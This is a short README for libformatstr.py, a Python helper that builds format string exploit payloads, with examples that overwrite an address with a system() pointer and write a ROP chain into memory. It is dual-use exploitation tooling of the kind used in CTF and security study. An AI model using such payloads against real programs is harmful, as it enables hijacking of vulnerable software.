libformatstr.py
====================

Small script to simplify format string exploitation.

Usage
---------------------

* Case 1 - replace one dword:

<pre>
import sys
from libformatstr import FormatStr

addr = 0x08049580
system_addr = 0x080489a3

p = FormatStr()
p[addr] = system_addr

# buf is 14th argument, 4 bytes are already printed
sys.stdout.write( p.payload(14, 4) )
</pre>

* Case 2 - put ROP code somewhere:

<pre>
import sys
from libformatstr import FormatStr

addr = 0x08049580
rop = [0x080487af, 0x0804873c, 0x080488de]
p = FormatStr()
p[addr] = rop

sys.stdout.write( p.payload(14) )
</pre>

About
---------------------

Author: hellman ( hellman1908@gmail.com )

License: GNU General Public License v2 (http://opensource.org/licenses/gpl-2.0.php)
